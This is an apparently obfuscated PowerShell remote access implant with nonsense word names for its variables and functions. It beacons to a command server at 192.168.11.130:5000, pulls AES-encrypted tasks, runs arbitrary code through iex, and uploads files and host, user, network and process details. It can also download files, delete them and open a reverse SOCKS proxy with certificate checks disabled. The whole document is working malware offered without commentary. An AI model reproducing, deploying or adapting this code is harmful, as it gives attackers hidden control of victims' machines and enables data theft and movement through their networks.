$yield = "5"
$teamwork = [System.Convert]::FromBase64String("k+REtlRcipkMkVW89B0j/RIN3rjxydFeGQ1QoldKypo=")
$nobleman = [System.Convert]::FromBase64String("tItX91yHRvj6EkVNFcRStQ==")
function empathy 
{
    $eagle = ipconfig /all | Out-String
    return $eagle

}
function scholarship 
{
    param([string] $linguistic) # the file path on disk we want to download
    
    $eagle = Get-Content -Path $linguistic -Raw

    return $eagle
}

function jeopardy 
{
    param([string] $linguistic) # the uri to get from, and the place to save to

    

    if($linguistic.Length -lt 1)
    {
        $linguistic = "upload"
    }
    else
    {
        $barnacle = $linguistic -split ';' -join ' '

        $linguistic = "`"$barnacle`""
    }
    
    Invoke-RestMethod -Uri "$monastery//$formula/$significant/$yield" -OutFile $linguistic
}
function recognize
{
    param([string] $flickering) # the directory or file we are enumerating

    $eagle = ls $flickering | Out-String
    $bioluminescence = $eagle.ToString()

    return $bioluminescence
    
}
function knapsack
{

    $eagle = pwd | Out-String
    $bioluminescence = $eagle.ToString()

    return $eagle
}
function immortal 
{
    param([string] $flickering) # the directory we are going to change to

    cd $flickering
    return "Attempted to change to $flickering."
}
function serendipity 
{
    param([string] $ferocious) # the item we want to remove

    rm $ferocious

    return "Attempted to remove $ferocious."

}
function adaptable-tcp 
{
   $eagle = Get-NetTCPConnection | Out-String
   return $eagle
}
function pioneer 
{
    $eagle = whoami /all | Out-String
    return $eagle
}
[ScriptBlock]$neon = {
    param( $ability )
    
    $whimsical = 
    {
            param( $ability )
            $ability.inStream.CopyTo($ability.outStream)
            Exit
    }

    $telescope = $ability.rsp

    function mosaic 
    {
        param($labyrinth)
        if ($labyrinth -as [ipaddress])
        {
            return $labyrinth
        }
        else
        {
            $exuberant = [System.Net.Dns]::GetHostAddresses($labyrinth)[0].IPAddressToString
        }
        return $exuberant
    }

    $horseshoe = $ability.cliConnection
    $azure = New-Object System.Byte[] 32


    try
    {
        $oblivious = $ability.cliStream
        $oblivious.Read($azure, 0, 2) | Out-Null

        $firefighter = $azure[0]
        
        if ($firefighter -eq 5)
        {
            $oblivious.Read($azure, 2, $azure[1]) | Out-Null
            for ($halcyon = 2; $halcyon -le $azure[1] + 1; $halcyon++) 
            {
                if ($azure[$halcyon] -eq 0) {break}
            }
            if ($azure[$halcyon] -ne 0)
            {
                $azure[1] = 255
                $oblivious.Write($azure, 0, 2)
            }
            else
            {
                $azure[1] = 0
                $oblivious.Write($azure, 0, 2)
            }

            $oblivious.Read($azure, 0, 4) | Out-Null
            $manuscript = $azure[1]
            $hospitable = $azure[3]

            if($manuscript -ne 1)
            {
                $azure[1] = 7
                $oblivious.Write($azure, 0, 2)
                throw "Not a connect"
            }

            if($hospitable -eq 1)
            {
                $judgment = New-Object System.Byte[] 4
                $oblivious.Read($judgment, 0, 4) | Out-Null
                $lightning = New-Object System.Net.IPAddress(,$judgment)
                $skyscraper = $lightning.ToString()
            }
            elseif($hospitable -eq 3)
            {
                $oblivious.Read($azure, 4, 1) | Out-Null
                $zookeeper = New-Object System.Byte[] $azure[4]
                $oblivious.Read($zookeeper, 0, $azure[4]) | Out-Null
                $skyscraper = [System.Text.Encoding]::ASCII.GetString($zookeeper)
            }
            else
            {
                $azure[1] = 8
                $oblivious.Write($azure, 0, 2)
                throw "Not a valid destination address"
            }

            $oblivious.Read($azure, 4, 2) | Out-Null
            $enchanting = $azure[4] * 256 + $azure[5]
            $unexpected = mosaic($skyscraper)

            if($unexpected -eq $null)
            {
                $azure[1] = 4
                $oblivious.Write($azure,0,2)
                throw "Cant resolve destination address"
            }

            $jamboree = New-Object System.Net.Sockets.TcpClient($unexpected, $enchanting)

            if($jamboree.Connected)
            {
                $azure[1] = 0
                $azure[3] = 1
                $azure[4] = 0
                $azure[5] = 0
                $oblivious.Write($azure, 0, 10)
                $oblivious.Flush()
                $yearn = $jamboree.GetStream() 
                $liberty = $yearn.CopyToAsync($oblivious)
                $venture = $oblivious.CopyToAsync($yearn)
                $venture.AsyncWaitHandle.WaitOne()
                $liberty.AsyncWaitHandle.WaitOne()
                
            }
            else
            {
                $azure[1] = 4
                $oblivious.Write($azure, 0, 2)
                throw "Cant connect to host"
            }
       }
       elseif($firefighter -eq 4)
       {
            $manuscript = $azure[1]
            if($manuscript -ne 1)
            {
                $azure[0] = 0
                $azure[1] = 91
                $oblivious.Write($azure, 0, 2)
                throw "Not a connect"
            }
            $oblivious.Read($azure, 2, 2) | Out-Null
            $enchanting = $azure[2] * 256 + $azure[3]
            $judgment = New-Object System.Byte[] 4
            $oblivious.Read($judgment, 0, 4) | Out-Null
            $unexpected = New-Object System.Net.IPAddress(,$judgment)
            $azure[0] = 1
            while ($azure[0] -ne 0){
                $oblivious.Read($azure, 0, 1)
            }
            $jamboree = New-Object System.Net.Sockets.TcpClient($unexpected, $enchanting)
            
            if($jamboree.Connected)
            {
                $azure[0] = 0
                $azure[1] = 90
                $azure[2] = 0
                $azure[3] = 0
                $oblivious.Write($azure, 0, 8)
                $oblivious.Flush()
                $yearn = $jamboree.GetStream() 
                $liberty = $yearn.CopyToAsync($oblivious)
                $venture = $oblivious.CopyTo($yearn)
                $venture.AsyncWaitHandle.WaitOne()
                $liberty.AsyncWaitHandle.WaitOne()
            }
       }
       else
       {
            throw "Unknown socks version"
       }
    }
    catch {
    }
    finally 
    {
        if ($horseshoe -ne $null) 
        {
            $horseshoe.Dispose()
        }
        if ($jamboree -ne $null) 
        {
            $jamboree.Dispose()
        }
        Exit;
    }
}

function literature{

    param ( [String] $archive,
            [Int] $jungle,
            [String] $fortitude = "",
            [Int] $aroma = 200,
            [Int] $xylotomy = 0 )

    try 
    {

        $wondrous = 0

        $telescope = [runspacefactory]::CreateRunspacePool(1, $aroma)
        $telescope.CleanupInterval = New-TimeSpan -Seconds 30
        $telescope.open()

        while($wondrous -lt 5)
        {
            Write-Host "Connecting to: " $archive ":" $jungle

            try
            {
                $horseshoe = New-Object System.Net.Sockets.TcpClient($archive, $jungle)
                $wanderlust = $horseshoe.GetStream()
                
                if($fortitude -eq '')
                {
                    $oblivious = New-Object System.Net.Security.SslStream($wanderlust, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                else
                {
                    $oblivious = New-Object System.Net.Security.SslStream($wanderlust, $false, ({return $glacier[1].GetCertHashString() -eq $fortitude } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                
                $oblivious.AuthenticateAsClient($archive, $null, [Net.SecurityProtocolType]::Tls12, $false)
                
                Write-Host "Connected"


                $wondrous = 0

                $azure = New-Object System.Byte[] 32
                $question = New-Object System.Byte[] 122

                $landscape = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $archive + "`n`n")
                $oblivious.Write($landscape, 0, $landscape.Length)
                
                $oblivious.ReadTimeout = 1000
                $oblivious.Read($question, 0, 122) | Out-Null
                
                $oblivious.Read($azure, 0, 5) | Out-Null
                
                $mandolin = [System.Text.Encoding]::ASCII.GetString($azure)
                
                Write-Host $mandolin

                if($mandolin -ne "HELLO")
                {
                    throw "No Client connected"
                }
                else
                {
                    Write-Host "Connection received"
                }


                $oblivious.ReadTimeout = 100000

                $ability = [PSCustomObject]@{"cliConnection" = $horseshoe ; "rsp" = $telescope ; "cliStream" = $oblivious }
                $yesterday = [PowerShell]::Create()
                $yesterday.RunspacePool = $telescope;
                $yesterday.AddScript($neon).AddArgument($ability) | Out-Null
                $yesterday.BeginInvoke() | Out-Null

            }
            catch
            {
                $wondrous = $wondrous + 1;

                try
                {
                    $horseshoe.Close()
                    $horseshoe.Dispose()
                }
                catch{}
                    sleep -Milliseconds 1
            }
        }
    }
    catch
    {
        throw $_;
    }
    finally
    {
        write-host "Server closed."

        if ($horseshoe -ne $null) 
        {
            $horseshoe.Dispose()
            $horseshoe = $null
        }
        if ($yesterday -ne $null -and $ecosystem -ne $null) 
        {
            $yesterday.EndInvoke($ecosystem) | Out-Null
            $yesterday.Runspace.Close()
            $yesterday.Dispose()
        }
    }
}

function renaissance
{
    param([string] $glacier)

    $eagle = (($glacier | iex) | Out-String)
    $bioluminescence = $eagle.ToString()

    return $bioluminescence
}

function glamour
{
    param([string]$victorious,     
        [string]$jackpot,   
        [string]$orchestra)            

    if ($victorious -eq "exit" -or $victorious -eq "checkin")
    {
        $eagle = ""
    }
	elseif($victorious -eq "ipconfig")
	{
		$eagle = empathy 
	}
	elseif($victorious -eq "download")
	{
		$eagle = scholarship $jackpot
	}
	elseif($victorious -eq "upload")
	{
		$eagle = jeopardy $jackpot
	}
	elseif($victorious -eq "dir")
	{
		$eagle = recognize $jackpot
	}
	elseif($victorious -eq "pwd")
	{
		$eagle = knapsack 
	}
	elseif($victorious -eq "cd")
	{
		$eagle = immortal $jackpot
	}
	elseif($victorious -eq "rm")
	{
		$eagle = serendipity $jackpot
	}
	elseif($victorious -eq "netstat-tcp")
	{
		$eagle = adaptable-tcp 
	}
	elseif($victorious -eq "whoami")
	{
		$eagle = pioneer 
	}
	elseif($victorious -eq "socks")
	{
		$eagle = literature $orchestra $jackpot
	}
	elseif($victorious -eq "iex")
	{
		$eagle = renaissance $jackpot
	}

	else
	{
		$eagle = '[!] Invalid Command'
	}

	return $eagle
}

$formula = "192.168.11.130:5000"
$cabinet = "tasks"
$conductor = "results"
$significant = "upload"
$labyrinthine = "4096"
$jaguar = "3"
$agility = "0.5"
$monastery = "http:"

$youthful = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$youthful.Add("Content-Type", "application/json")

Add-Type -AssemblyName System.Security

try{

add-type @"
     using System.Net;
     using System.Security.Cryptography.X509Certificates;
     public class TrustAllCertsPolicy : ICertificatePolicy {
         public bool CheckValidationResult(
             ServicePoint srvPoint, X509Certificate certificate,
             WebRequest request, int certificateProblem) {
             return true;
         }
     }
"@
[System.Net.ServicePointManager]::CertificatePolicy = new-object TrustAllCertsPolicy
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
}
catch{ throw $_; }

function octopus
{
  param($fabric, $chivalry, $butterfly)

    $utopia = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $utopia.Key = $chivalry
    $utopia.IV = $butterfly
    $utopia.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $utopia.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $exemplary = $utopia.CreateDecryptor()

    $geode = $exemplary.TransformFinalBlock($fabric, 0, $fabric.Length)

    return $geode
}

function lavender
{
    param($lemonade, $yourself, $reciprocal)

    $hummingbird = [System.Security.Cryptography.Aes]::Create()
    $hummingbird.Key = $yourself
    $hummingbird.IV = $reciprocal
    $hummingbird.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $hummingbird.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $opaque = $hummingbird.CreateEncryptor()

    $illustrator = $opaque.TransformFinalBlock($lemonade, 0, $lemonade.Length)
    $hummingbird.Dispose()

    $miraculous = [System.Convert]::ToBase64String($illustrator)

    return $miraculous

}

function airplane
{
    param($epiphany, 
          $keen,  
          $reverie, $zephyr)         

   
   $javelin = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($epiphany))

   $celebration = octopus $keen $reverie $zephyr

   $catalyst = 1
   for($yucca = 0; $yucca -lt $javelin.Length; $yucca++)
   {        
        if($javelin[$yucca] -ne $celebration[$yucca])
        {
            $catalyst = 0
        }
   }

   return $catalyst
}

function workshop
{
    param($elaborate,
          $safari, $xerox)         

    $javelin = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($elaborate))
    
    $microscope = lavender $javelin $safari $xerox


    return $microscope
}


function inquisitive
{

    param([string]$anchor,        
          [int]$unorthodox,     
          [int]$labyrinthine)    


    $universal = [Math]::Min($labyrinthine, $anchor.Length-$unorthodox)

    $prodigy = $anchor.SubString($unorthodox, $universal)

    $kaleidoscope = $universal + $unorthodox
    
    if($kaleidoscope -ge $anchor.Length)
    {
        $kaleidoscope = "true"
    }

    return "$prodigy<chnk>$kaleidoscope"
}


function mathematics
{

    $elaborate = ""

    $dedication = ((Get-NetIPConfiguration | Select-Object InterfaceAlias, Ipv4Address) | Out-String)
    $gigantic = ((Get-NetAdapter | Select-Object Name, MacAddress, Status) | Out-String)
    $glistening = ((Get-NetIPInterface | Select-Object InterfaceAlias, Dhcp) | Out-String)
    $vigilant = [System.Net.Dns]::GetHostName()
    $yoga = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $tangible = (Get-CimInstance Win32_ComputerSystem).Domain
    $constellation = [System.Net.Dns]::GetHostEntry("").HostName
    $efficiency = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ProcessId).ProcessId
    $occasional = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ParentProcessId).ParentProcessId

    $elaborate = "$dedication<sa>$gigantic<sa>$glistening<sa>$vigilant<sa>$yoga<sa>$tangible<sa>$constellation<sa>$efficiency<sa>$occasional"

    return $elaborate
}

function gentleman 
{

    $barnacle = ""

    $resilience = Invoke-RestMethod "$monastery//$formula/$cabinet/$yield" -Method 'GET' -Headers $youthful

    $melancholy = $resilience -split '\n'

    foreach ($limerick in $melancholy)
    {

        if($limerick.Length -gt 0)
        {
            $oxymoron = [System.Convert]::FromBase64String($limerick)
            $oxymoron = octopus $oxymoron $teamwork $nobleman
            $spectacle = [System.Text.Encoding]::UTF8.GetString($oxymoron)


            $spectacle = $spectacle -split ','
            $tactile = $spectacle[0]
            $unfathomable = $spectacle[1]
            $occupation = $spectacle[2]
            $billiards = [System.Convert]::FromBase64String($spectacle[3])

            $magnificent = "$tactile,$unfathomable,$occupation"
            $tendency = airplane $magnificent $billiards $teamwork $nobleman

            if($tendency)
            {

                $barnacle += "$tactile<br>$unfathomable<br>$occupation<br>0<br><end>"
            }
        }
    }

    return $barnacle

}

function xylophone
{
    param($xenophobia)

    $gingerbread = @()

    for ($yucca = 0; $yucca -lt $xenophobia.Length; $yucca++)
    {

        

        $victorious = $xenophobia[$yucca]

        if($victorious.Length -gt 0)
        {

            $camouflage = $victorious -split '<br>'
    
            $tactile = $camouflage[0]
            $unfathomable = $camouflage[1]
            $occupation = $camouflage[2]
            $unorthodox = $camouflage[3]
            
            if($unorthodox -eq 0)
            {

                $eagle = glamour $unfathomable $occupation ($formula -split ":")[0]

            }
            else
            {
                $eagle = $camouflage[4]
            }
            

            $prodigy = (inquisitive $eagle $unorthodox $labyrinthine) -split "<chnk>"

            $audacity = $prodigy[0]
            $unorthodox = $prodigy[1]

            $apple = Get-Date -UFormat "%Y%m%d %H:%M:%S UTC"

            $incandescent = mathematics

            $fragment = "$tactile<br>$audacity<br>$apple<br>$incandescent"

            $billiards = workshop $fragment $teamwork $nobleman
            $oxymoron = [System.Text.Encoding]::UTF8.GetBytes("$fragment<br>$billiards")
            $quixotic = lavender $oxymoron $teamwork $nobleman


            Invoke-RestMethod "$monastery//$formula/$conductor/$yield" -Method 'POST' -Headers $youthful -Body $quixotic
            if($unfathomable -eq "exit")
            {
                exit
            }

            
            if($unorthodox -ne "true")
            {
                $xenophobia[$yucca] = "$tactile<br>$unfathomable<br>$occupation<br>$unorthodox<br>$eagle"
                $gingerbread += $xenophobia[$yucca]
            }

            
        }

    }

    return $gingerbread
}


function daffodil
{

    $xenophobia = @()

    while($true)
    {

        $barnacle = ((gentleman $formula, $cabinet $xenophobia) -split '<end>') | Select-Object -SkipLast 1

        if($barnacle.Length -gt 0)
        {
            $xenophobia += $barnacle
        }

        $xenophobia = @(xylophone $xenophobia)


        $bullseye = Get-Random -Minimum ((1-$agility)*$jaguar) -Maximum $jaguar
        Start-Sleep -Seconds $bullseye

    }
}

daffodil